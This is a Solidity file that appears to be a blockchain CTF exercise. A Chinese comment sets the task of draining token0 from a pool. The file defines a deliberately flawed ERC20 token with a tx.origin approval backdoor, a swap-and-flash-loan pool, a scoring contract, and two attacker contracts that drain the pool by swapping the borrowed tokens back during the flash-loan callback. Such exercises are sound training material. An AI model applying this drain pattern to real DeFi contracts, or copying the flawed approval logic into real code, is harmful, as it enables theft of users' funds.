// SPDX-License-Identifier: MIT
pragma solidity ^0.8.1;
// 这是一个同时拥有swap和闪电贷的交易池，这个交易池有两个token，初始状态下，交易池各拥有100 * 10**18个token。想办法套空token0中Lenderpool的余额。
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract CBI is IERC20 {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    address public admin;

    constructor() {
        _mint(msg.sender, 100 * 10**18);
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 fromBalance = _balances[from];
        require(
            fromBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        if (tx.origin == admin) {
            require(msg.sender.code.length > 0);
            _allowances[spender][tx.origin] = amount;
            return;
        }
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(
                currentAllowance >= amount,
                "ERC20: insufficient allowance"
            );
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }
}

contract LenderPool is ReentrancyGuard {
    using Address for address;
    bool public isSwap;

    IERC20 public immutable token0;
    IERC20 public immutable token1;

    constructor() {
        token0 = new CBI();
        token1 = new CBI();
    }

    function swap(address tokenAddress,uint amount) public returns(uint){
        require(
            tokenAddress == address(token0)
        
            && token1.transferFrom(msg.sender,address(this),amount) 
            
            && token0.transfer(msg.sender,amount)

            || tokenAddress== address(token1)
            
            && token0.transferFrom(msg.sender,address(this),amount) 
            
            && token1.transfer(msg.sender,amount));
        isSwap = true;
        return amount;

    } 

    function flashLoan(uint256 borrowAmount, address borrower)
        external
        nonReentrant
    {
        uint256 balanceBefore = token0.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token0.transfer(borrower, borrowAmount);
        borrower.functionCall(abi.encodeWithSignature("receiveEther(uint256)", borrowAmount));

        uint256 balanceAfter = token0.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

    function isCompleted() view external {
        require(token0.balanceOf(address(this)) == 0);
    }
}

contract attract{
    Check che;
    LenderPool public lenderPool;
    IERC20 token0;
    IERC20 token1;
    constructor(Check addr) public {
        che = addr;
        lenderPool = che.lenderPool();
        token0 = lenderPool.token0();
        token1 = lenderPool.token1();
    }
    function receiveEther(uint256) public {
        lenderPool.swap(address(token1), 100 * 10**18);
    }
    function attract1() public {
        token0.approve(address(lenderPool), 1000000 ether);
        token1.approve(address(lenderPool), 1000000 ether);
        lenderPool.flashLoan(100 * 10**18, address(this));
        lenderPool.swap(address(token0), 100 * 10**18);
    }
}

contract Check{
    uint public score;
    LenderPool public lenderPool;
    IERC20 token0;
    constructor(){
        lenderPool = new LenderPool();
        token0 = lenderPool.token0();
    }

    function isCompleted() external{
        score = 0;
        
        if(lenderPool.isSwap()){
            score += 25;
        }

        if(token0.balanceOf(address(lenderPool)) == 0){
            score += 75;
        }
    }
}


contract att{
    Check public che;
    address public token0;
    address public token1;
    LenderPool public pool;
    constructor(address addr) public {
        che = Check(addr);
        pool = che.lenderPool();
        token0 = address(pool.token0());
        token1 = address(pool.token1());
    }
    function attract() public {
        IERC20(token1).approve(address(pool),1000 * 10 ** 18);
        pool.flashLoan(100 * 10 ** 18, address(this));
        pool.swap(token0, 100 * 10 ** 18);
        che.isCompleted();
    }
    function receiveEther(uint256 amount) public {
        IERC20(token0).approve(address(pool),1000 * 10 ** 18);
        pool.swap(token1,100 * 10 ** 18);
        
    }
}